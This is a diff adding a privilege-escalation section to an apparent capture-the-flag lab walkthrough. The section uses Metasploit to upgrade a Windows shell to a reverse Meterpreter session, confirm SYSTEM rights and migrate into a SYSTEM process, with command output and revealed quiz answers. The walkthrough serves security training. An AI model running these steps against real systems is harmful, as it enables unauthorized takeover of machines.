@@ -139,4 +139,76 @@ With that done, run the exploit. You can run the exploit with either the `run` o
 The exploit is running successfully if you see the Windows shell: `C:\Windows\system32>`.
 !!!
 
-### Escalate
+### Privilege Escalation
+
+**If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**
+
+Background the shell now with <kbd>CTRL</kbd> + <kbd>Z</kbd>.
+
+==- Reveal Answer
+`use post/multi/manage/shell_to_meterpreter`
+===
+
+**Select this (use MODULE_PATH). Show options, what option are we required to change?**
+
+Type in the command `use post/multi/manage/shell_to_meterpreter`. Now use `show options` to list the arguments. What option is required but not set?
+
+    Module options (post/multi/manage/shell_to_meterpreter):                                                                                                                      
+                                                                                                                                                                                
+    Name     Current Setting  Required  Description                                                                                                                            
+    ----     ---------------  --------  -----------                                                                                                                            
+    HANDLER  true             yes       Start an exploit/multi/handler to receive the connection                                                                               
+    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).                                                
+    LPORT    4433             yes       Port for payload to connect to.                                                                                                        
+    SESSION                   yes       The session to run this module on
+
+==- Reveal Answer
+SESSION
+===
+
+Now type `sessions` in your terminal. Set the session with command `set SESSION <SESSION_ID>`.
+
+    Active sessions                                                                                                                                                               
+    ===============                                                                                                                                                               
+                                                                                                                                                                                
+    Id  Name  Type               Information                                               Connection                                                                           
+    --  ----  ----               -----------                                               ----------                                                                           
+    1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -> 10.10.209.54:49233 (10.10.209.54)
+
+Run the post exploit using command `run`. If it doesn't work the first time, run the exploit again.
+
+    [*] Upgrading session ID: 1
+    [*] Starting exploit/multi/handler
+    [*] Started reverse TCP handler on 10.18.96.75:4433 
+    [*] Post module execution completed
+    msf6 post(multi/manage/shell_to_meterpreter) > 
+    [*] Sending stage (200774 bytes) to 10.10.209.54
+    [*] Meterpreter session 2 opened (10.18.96.75:4433 -> 10.10.209.54:49261) at 2022-05-26 12:22:59 -0400
+    [*] Stopping exploit/multi/handler
+
+This will create a second session. Type in `sessions` to list them both. Note that session 2 is the meterpreter session.
+
+    Active sessions
+    ===============
+
+    Id  Name  Type                     Information                                               Connection
+    --  ----  ----                     -----------                                               ----------
+    1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -> 10.10.209.54:49233 (10.10.209.54)
+    2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.96.75:4433 -> 10.10.209.54:49261 (10.10.209.54)
+
+To get in the meterpreter session use the command `sessions <SESSION_ID>`. Now run the `getsystem` command to verify if we successfully escalated our privileges to `NT AUTHORITY\SYSTEM`.
+
+    meterpreter > getsystem
+    [-] Already running as SYSTEM
+
+Now run the `ps` command to list all the running processes on the traget machine.
+
+![Running processes on target machine](/static/images/exploit-ps.png)
+
+Migrate a process that is running under `NT AUTHORITY\SYSTEM` with the command `migrate [pid]`. It case it fails, chose another process id.
+
+    meterpreter > migrate 700
+    [*] Migrating from 1448 to 700...
+    [*] Migration completed successfully.
+
+### Cracking
